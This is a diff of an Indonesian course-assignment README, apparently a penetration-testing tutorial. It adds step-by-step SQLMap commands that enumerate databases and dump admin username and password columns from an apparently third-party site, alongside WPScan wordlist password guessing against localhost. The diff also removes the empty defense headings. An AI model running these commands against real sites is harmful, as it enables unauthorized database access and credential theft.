@@ -124,7 +124,7 @@ python sqlmap.py
 ```
 
 ## Langkah Penetrasi SQL Injection
-
+### WPScan
 1. Lakukan perintah ini untuk melakukan pull terbaru dari git WPScan dan update database
 ```
 git pull
@@ -147,12 +147,39 @@ ruby wpscan.rb --url http://localhost/wordpress --wordlist wordlist.txt threads 
 5. Jika selesai dijalnkan dan password ditemukan, tampilan di terminal menjadi seperti berikut :
 
 ![alt text](https://github.com/hendradn/pksj2017/blob/master/Tugas%202/Screenshoot/12-instalasi.PNG)
+### SQLMap
 
+1. Jalankan perintah berikut di terminal untuk mengetahui type database yang digunakan:
+```
+python sqlmap.py -u "<Link yang akan diinject>"
+
+contoh :  python sqlmap.py -u "http://vacationet.com/resort.php?id=2"
+```
+![alt text](https://github.com/hendradn/pksj2017/blob/master/Tugas%202/Screenshoot/13-ujicoba.PNG)
+
+2. Untuk mengathui nama database, ketikkan perintah berikut :
+```
+python sqlmap.py -u "http://vacationet.com/resort.php?id=2" --dbs
+```
+![alt text](https://github.com/hendradn/pksj2017/blob/master/Tugas%202/Screenshoot/14-ujicoba.PNG)
+
+3. Untuk mengetahui daftar tabel beserta kolomnya pada database , ketikkan perintah berikut :
+```
+python sqlmap.py -u "http://vacationet.com/resort.php?id=2" --dbs --columns 
+```
+![alt text](https://github.com/hendradn/pksj2017/blob/master/Tugas%202/Screenshoot/15.1-ujicoba.PNG)
+
+Pilih nama tabel yang sekiranya menyimmpan username dan password
+![alt text](https://github.com/hendradn/pksj2017/blob/master/Tugas%202/Screenshoot/15.2-ujicoba.PNG)
+
+4. Jika sudah menemukan target tabel ketikkan perintah berikut unutuk melihat isi dari tabel tersebut :
+```
+python sqlmap.py -u "http://vacationet.com/resort.php?id=2" --dbms mysql -D vacation -T config -C config_admin_pass,config_admin_user --dump
+```
+![alt text](https://github.com/hendradn/pksj2017/blob/master/Tugas%202/Screenshoot/16-ujicoba.PNG)
 # Kesimpulan dan Saran
-## Defense
 
-## Countermeasure
-
+1. Terdapat beberapa plugin wordpress yang rentan dengan SQL injection
 
 # Refrensi
   * https://id.wikipedia.org/wiki/WordPress
